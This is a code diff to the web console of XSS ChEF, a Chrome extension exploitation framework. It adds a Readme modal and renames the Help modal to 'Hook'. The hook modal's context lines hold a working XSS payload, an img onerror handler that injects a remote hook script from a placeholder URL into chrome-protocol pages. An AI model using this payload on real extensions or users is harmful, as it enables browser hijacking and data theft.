@@ -10,6 +10,7 @@ span,td,th {font-size: 11px; line-height: 14px;}
 #tabs-container {
 overflow-y: auto;
 }
+#readme {max-height: 400px; overflow-y: auto;}
 .currentTableRow td {
 background-color: #0088CC !important;
 color: #FFFFFF !important;
@@ -34,7 +35,8 @@ display:none;
         <div class="container">
         <ul class="nav pull-right">
             <li><a href="#about-modal" data-toggle=modal>About</a></li>
-            <li><a href="#help-modal" data-toggle=modal>Help</a></li>
+            <li><a href="#readme-modal" data-toggle=modal>Readme</a></li>
+            <li><a href="#hook-modal" data-toggle=modal>Hook</a></li>
         </ul>
             <a class="brand"  href="#">XSS ChEF - Chrome Extension Exploitation Framework</a>
         </div>
@@ -236,7 +238,7 @@ display:none;
       </ul>
   </div>
   </div>
-<div class="modal" id="help-modal">
+<div class="modal" id="hook-modal">
   <div class="modal-header">
     <a class="close" data-dismiss="modal">&times;</a>
     <h3>Help</h3>
@@ -247,6 +249,17 @@ display:none;
       <p>For example:
       <pre class="hook-url">&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='__HOOK_URL__';d.body.appendChild(e);}"&gt;</pre>
       <p>After hook has been executed, launch this console (in a separate browser), choose hooked session by clicking on the <i class="icon-list"></i> and start having fun!
+  </div>
+</div>
+
+<div class="modal" id="readme-modal">
+  <div class="modal-header">
+    <a class="close" data-dismiss="modal">&times;</a>
+    <h3>Readme</h3>
+  </div>  
+    <div class="modal-body">
+    <pre id=readme>
+    </pre>
   </div>
 </div>
 
@@ -583,9 +596,7 @@ $(function() {
     refreshTabsTable(hookStorage.getTabs(hook));
     al("Refreshed state from local storage");
     fillDataTemplate($('#tab-ext-info'), hookStorage.retrieve(hook, 'info', {}));
-
-
-
+    $.get('README.md', function(t) { console.log(t);$('#readme').text(t) });
 });
 </script>
 </body>
